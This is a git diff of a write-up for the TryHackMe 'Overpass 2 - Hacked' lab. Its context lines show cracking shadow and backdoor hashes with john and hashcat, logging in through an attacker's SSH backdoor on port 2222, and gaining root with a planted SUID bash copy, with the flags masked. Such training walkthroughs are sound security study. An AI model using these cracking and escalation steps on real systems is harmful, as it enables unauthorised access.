@@ -20,7 +20,6 @@ Room Link: [https://tryhackme.com/room/overpass2hacked](https://tryhackme.com/ro
 - Check and match `md5sum` of the file to verify file.
 
 ```bash
-
 md5sum overpass2.pcapng 
 11c3b2e9221865580295bc662c35c6dc  overpass2.pcapng
 ```
@@ -37,7 +36,6 @@ md5sum overpass2.pcapng
 - Then we can run john to check.
 
 ```bash
-
 john --wordlist=fasttrack.txt shadow 
 Loaded 5 password hashes with 5 different salts (crypt, generic crypt(3) [?/64])
 Will run 8 OpenMP threads
@@ -63,7 +61,6 @@ Session completed
 - As we can find in the backdoor code that it is `sha512`. So we can decode it using `hashcat`.
 
 ```bash
-
 hashcat -m 1710 "6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05" --force /opt/wordlist/rockyou.txt --quiet
 6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed:1c362db832f3f864c8c2fe05f2002a05:no******6
 ```
@@ -77,7 +74,6 @@ hashcat -m 1710 "6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a
 - We have repeat attackers steps. Now we can login to the ssh port 2222 opened by the backdoor as we saw in `strings` output. We already have username `james` and can use cracked password. We need to use `-oHostKeyAlgorithms=+ssh-rsa` to get ssh as there is an error.
 
 ```bash
-
 ssh -p 2222 james@10.10.136.126
 Unable to negotiate with 10.10.136.126 port 2222: no matching host key type found. Their offer: ssh-rsa
 $ ssh -oHostKeyAlgorithms=+ssh-rsa james@10.10.136.126 -p 2222
@@ -94,7 +90,6 @@ See "man sudo_root" for details.
 - Question `What's the user flag?` Answer `thm{****************}`
 
 ```bash
-
 james@overpass-production:/home/james/ssh-backdoor$ cat /home/james/user.txt
 thm{****************}
 ```
@@ -103,7 +98,6 @@ thm{****************}
 - Question `What's the root flag?` Answer `thm{***************************}`
 
 ```bash
-
 james@overpass-production:/home/james/ssh-backdoor$ /home/james/.suid_bash -p
 .suid_bash-4.4# id
 uid=1000(james) gid=1000(james) euid=0(root) egid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),1000(james)
